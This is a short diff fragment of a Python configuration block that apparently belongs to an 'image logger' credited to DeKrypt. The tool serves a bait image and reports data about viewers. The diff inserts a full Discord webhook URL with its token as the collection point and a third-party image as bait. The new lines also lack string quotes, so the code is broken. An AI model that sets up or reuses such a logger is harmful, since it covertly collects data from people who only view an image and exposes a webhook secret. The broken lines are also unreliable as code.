@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": https://discord.com/api/webhooks/1369953974559703121/MXQrXTaIGyaMMcxRuUykH6JdWj1YZ_p_ZpjchqwNEUD_Bai6yCD7kMVBef2LB0Zb3OR_
+    "image": https://douglasbaseball.com/wp-content/uploads/2019/11/tic-tac-toe-template-trafficfunnlr-intended-for-tic-tac-with-regard-to-tic-tac-toe-template-word.jpg
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
